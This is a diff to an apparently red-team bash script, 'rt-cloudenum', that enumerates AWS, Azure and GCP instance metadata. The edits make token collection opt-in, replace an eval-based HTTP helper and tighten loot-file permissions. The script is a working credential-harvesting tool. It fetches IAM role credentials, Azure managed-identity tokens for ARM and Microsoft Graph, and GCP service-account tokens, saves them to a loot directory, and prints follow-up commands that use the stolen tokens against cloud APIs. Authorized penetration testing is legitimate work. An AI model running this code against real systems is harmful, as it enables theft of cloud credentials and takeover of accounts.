@@ -23,13 +23,15 @@
 #       hosts you are authorized to assess. Tokens are written to the loot dir.
 # ============================================================================
 set -u
+umask 077  # loot dirs/files not world-readable
 
-OUTBASE="."; JSON=0; NOTOKEN=0
+OUTBASE="."; JSON=0; COLLECT=0
 while [ $# -gt 0 ]; do
   case "$1" in
     -o) OUTBASE="$2"; shift 2;;
     -j|--json) JSON=1; shift;;
-    --no-token) NOTOKEN=1; shift;;
+    --collect-tokens) COLLECT=1; shift;;              # ACTIVE: fetch & save IMDS credential tokens
+    --no-token) shift;;                               # deprecated: discovery-only is now the default (no-op)
     -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
     *) echo "unknown arg: $1"; exit 1;;
   esac
@@ -37,6 +39,7 @@ done
 
 HOST=$(hostname 2>/dev/null || echo host); TS=$(date +%Y%m%d_%H%M%S)
 RUN="${OUTBASE%/}/cloudenum_${HOST}_${TS}"; mkdir -p "$RUN" 2>/dev/null || { echo "[-] cannot create $RUN"; exit 1; }
+chmod 700 "$RUN" 2>/dev/null
 if [ -t 1 ]; then R=$'\e[31m'; Y=$'\e[33m'; C=$'\e[36m'; G=$'\e[32m'; D=$'\e[90m'; N=$'\e[0m'; else R=; Y=; C=; G=; D=; N=; fi
 SUMMARY="$RUN/00_SUMMARY.txt"; NEXT="$RUN/NEXT_STEPS.txt"; JFILE="$RUN/findings.json"
 : > "$SUMMARY"; : > "$NEXT"; HIGHN=0; MEDN=0; INFON=0
@@ -50,10 +53,10 @@ flag(){ sev="$1"; shift; txt="$*"; case "$sev" in
 nextstep(){ printf '[*] %s\n    %s\n\n' "$1" "$2" >> "$NEXT"; J_NEXT+=("$1 :: $2"); }
 save(){ cat > "$RUN/$1"; }
 has(){ command -v "$1" >/dev/null 2>&1; }
-# fast http getter (curl or wget), 3s timeout; args: URL [header ...]
-GET(){ url="$1"; shift; hdrs=""; for h in "$@"; do hdrs="$hdrs -H \"$h\""; done
-  if has curl; then eval "curl -s --max-time 3 $hdrs '$url'" 2>/dev/null
-  elif has wget; then wh=""; for h in "$@"; do wh="$wh --header=\"$h\""; done; eval "wget -q -T 3 -O - $wh '$url'" 2>/dev/null; fi; }
+# fast http getter (curl or wget), 3s timeout; args: URL [header ...] - array-based, no eval
+GET(){ url="$1"; shift
+  if has curl; then local a=(curl -s --max-time 3); for h in "$@"; do a+=(-H "$h"); done; "${a[@]}" "$url" 2>/dev/null
+  elif has wget; then local a=(wget -q -T 3 -O -); for h in "$@"; do a+=(--header="$h"); done; "${a[@]}" "$url" 2>/dev/null; fi; }
 
 IMDS=169.254.169.254
 enumgod_banner(){
@@ -70,7 +73,8 @@ ART
 }
 enumgod_banner "cloud / IMDS"
 echo "${G}[*] rt-cloudenum  ->  $RUN${N}"
-echo "${D}[*] $(date)  host=$HOST  no-token=$NOTOKEN${N}"
+echo "${D}[*] $(date)  host=$HOST  mode=$([ "$COLLECT" = 1 ] && echo ACTIVE:collect-tokens || echo discovery-only)${N}"
+[ "$COLLECT" = 1 ] && echo "${Y}[!] --collect-tokens: will FETCH & SAVE IMDS credential tokens to the 0700 loot dir (ACTIVE credential access).${N}" >&2
 
 PROVIDER="unknown"
 
@@ -92,8 +96,8 @@ if [ -n "$AWS_ID" ]; then
   ROLE=$(GET "http://$IMDS/latest/meta-data/iam/security-credentials/" "${AWS_H[@]}")
   if [ -n "$ROLE" ]; then
     flag HIGH "Attached IAM role via IMDS: $ROLE"
-    if [ "$NOTOKEN" = "0" ]; then
-      GET "http://$IMDS/latest/meta-data/iam/security-credentials/$ROLE" "${AWS_H[@]}" | save 01_aws_role_creds.json
+    if [ "$COLLECT" = "1" ]; then
+      GET "http://$IMDS/latest/meta-data/iam/security-credentials/$ROLE" "${AWS_H[@]}" | save 01_aws_role_creds.json; chmod 600 "$RUN/01_aws_role_creds.json" 2>/dev/null
       grep -q 'SecretAccessKey' "$RUN/01_aws_role_creds.json" 2>/dev/null && {
         flag HIGH "Retrieved temporary AWS role credentials (AccessKey/Secret/Token) -> 01_aws_role_creds.json."
         nextstep "Use AWS role creds" "export AWS_ACCESS_KEY_ID=..; export AWS_SECRET_ACCESS_KEY=..; export AWS_SESSION_TOKEN=..; aws sts get-caller-identity"
@@ -118,15 +122,15 @@ if echo "$AZ_META" | grep -qi 'azEnvironment\|subscriptionId\|vmId'; then
   SUB=$(echo "$AZ_META" | grep -oE '"subscriptionId":"[^"]+"' | head -1)
   [ -n "$SUB" ] && flag INFO "Azure $SUB"
   # managed identity token for ARM
-  if [ "$NOTOKEN" = "0" ]; then
+  if [ "$COLLECT" = "1" ]; then
     MIT=$(GET "http://$IMDS/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" "Metadata: true")
     if echo "$MIT" | grep -q 'access_token'; then
-      echo "$MIT" | save 02_azure_mi_token.json
+      echo "$MIT" | save 02_azure_mi_token.json; chmod 600 "$RUN/02_azure_mi_token.json" 2>/dev/null
       flag HIGH "Retrieved Azure Managed Identity token for ARM -> 02_azure_mi_token.json."
       nextstep "Use Azure MI token (ARM)" "TOKEN=\$(jq -r .access_token 02_azure_mi_token.json); curl -s -H \"Authorization: Bearer \$TOKEN\" https://management.azure.com/subscriptions?api-version=2020-01-01"
       # also grab a Graph token (Entra enumeration)
       GT=$(GET "http://$IMDS/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" "Metadata: true")
-      echo "$GT" | grep -q 'access_token' && { echo "$GT" | save 02_azure_mi_graph.json; flag HIGH "Also retrieved a Microsoft Graph token (Entra ID enumeration) -> 02_azure_mi_graph.json."; nextstep "Entra via Graph token" "TOKEN=\$(jq -r .access_token 02_azure_mi_graph.json); curl -s -H \"Authorization: Bearer \$TOKEN\" https://graph.microsoft.com/v1.0/me"; }
+      echo "$GT" | grep -q 'access_token' && { echo "$GT" | save 02_azure_mi_graph.json; chmod 600 "$RUN/02_azure_mi_graph.json" 2>/dev/null; flag HIGH "Also retrieved a Microsoft Graph token (Entra ID enumeration) -> 02_azure_mi_graph.json."; nextstep "Entra via Graph token" "TOKEN=\$(jq -r .access_token 02_azure_mi_graph.json); curl -s -H \"Authorization: Bearer \$TOKEN\" https://graph.microsoft.com/v1.0/me"; }
     fi
   fi
 else
@@ -145,9 +149,9 @@ if [ -n "$GCP_PROJ" ]; then
   } | save 03_gcp_meta.txt
   SCOPES=$(GET "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" "Metadata-Flavor: Google")
   echo "$SCOPES" | grep -q 'cloud-platform' && flag HIGH "GCP service account has cloud-platform scope (full API access)."
-  if [ "$NOTOKEN" = "0" ]; then
+  if [ "$COLLECT" = "1" ]; then
     GTOK=$(GET "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" "Metadata-Flavor: Google")
-    echo "$GTOK" | grep -q 'access_token' && { echo "$GTOK" | save 03_gcp_token.json; flag HIGH "Retrieved GCP service-account access token -> 03_gcp_token.json."; nextstep "Use GCP SA token" "TOKEN=\$(jq -r .access_token 03_gcp_token.json); curl -s -H \"Authorization: Bearer \$TOKEN\" https://cloudresourcemanager.googleapis.com/v1/projects"; }
+    echo "$GTOK" | grep -q 'access_token' && { echo "$GTOK" | save 03_gcp_token.json; chmod 600 "$RUN/03_gcp_token.json" 2>/dev/null; flag HIGH "Retrieved GCP service-account access token -> 03_gcp_token.json."; nextstep "Use GCP SA token" "TOKEN=\$(jq -r .access_token 03_gcp_token.json); curl -s -H \"Authorization: Bearer \$TOKEN\" https://cloudresourcemanager.googleapis.com/v1/projects"; }
   fi
   # project-wide SSH keys / startup scripts
   GET "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script" "Metadata-Flavor: Google" | save 03_gcp_startup.txt
